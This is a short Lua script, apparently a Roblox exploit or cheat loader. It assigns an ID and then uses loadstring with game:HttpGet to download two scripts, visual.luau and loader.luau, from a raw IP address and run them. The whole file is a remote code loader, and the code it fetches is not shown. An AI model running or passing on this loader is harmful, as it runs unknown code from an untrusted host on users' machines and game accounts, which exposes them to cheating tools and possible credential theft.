ID = "32fc6b08-2829-4179-8e59-e807d04c35b1";

-- Load the Visual UI (it won't show yet)
RUN_AFTER = loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"));

-- Load the main loader (it will call RUN_AFTER later)
loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
